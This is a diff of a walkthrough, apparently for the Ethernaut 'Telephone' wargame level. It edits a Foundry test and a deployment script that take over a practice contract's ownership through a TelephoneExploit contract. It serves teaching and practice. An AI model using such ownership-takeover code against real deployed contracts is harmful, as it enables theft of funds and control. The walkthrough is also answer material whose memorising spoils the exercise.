@@ -122,15 +122,8 @@ contract TelephoneExploit {
 ```solidity
 contract TelephoneTest is Test {
 
-    Telephone public level;
-
-    address instance = vm.addr(0x10053); 
+    Telephone public level = new Telephone();
     address hacker = vm.addr(0x1337); 
-
-    function setUp() public {
-        vm.prank(instance);
-        level = new Telephone();
-    }
 
     function testTelephoneHack() public {
 
@@ -142,7 +135,6 @@ contract TelephoneTest is Test {
 
         assertEq(level.owner(), hacker);
         vm.stopPrank();
-        
     }
 }
 ```
@@ -168,12 +160,12 @@ contract TelephoneTest is Test {
 ```solidity
 contract Exploit is Script {
 
-        Telephone level = Telephone(instance); 
-        TelephoneExploit public exploit;
-        address instance = vm.envAddress("INSTANCE_LEVEL4");
-        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
+      address instance = vm.envAddress("INSTANCE_LEVEL4");
+      address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
+      Telephone level = Telephone(instance); 
+      TelephoneExploit public exploit;
         
-        function run() external {
+      function run() external {
 
             vm.startBroadcast(hacker);
             exploit = new TelephoneExploit();
